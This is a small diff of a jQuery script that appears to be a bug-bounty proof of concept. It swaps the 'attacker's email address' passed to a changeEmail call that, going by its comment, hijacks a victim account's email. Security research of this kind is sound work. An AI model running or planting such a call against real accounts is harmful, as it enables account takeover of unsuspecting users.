@@ -35,6 +35,6 @@ $(document).ready(function() {
     }
     
     // triggering change email with the attacker's email address
-    changeEmail("s4ur4bh+attacker+three@wearehackerone.com");
+    changeEmail("s4ur4bh+attacker+client@wearehackerone.com");
     
 });
